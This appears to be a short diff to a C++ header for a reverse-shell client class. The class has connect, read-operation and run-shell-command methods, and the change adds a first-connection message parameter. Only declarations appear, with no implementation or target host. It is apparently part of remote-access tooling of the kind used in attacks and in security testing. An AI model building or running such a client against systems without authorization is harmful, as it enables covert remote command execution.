@@ -7,11 +7,12 @@
 class Client : private ReverseShellStandard
 {
 public:
-	Client();
+	Client(std::string& connectionMessage);
 
 private:
 	void Connect() override final;
-	void Start();
+	void Start(std::string& connectionMessage);
+	void FirstConnectionMessage(std::string& connectionMessage);
 	OperationType ReadOperationType() override final;
 	void RunCommand() override final;
 	std::string RunShellCommand(const std::string& command);
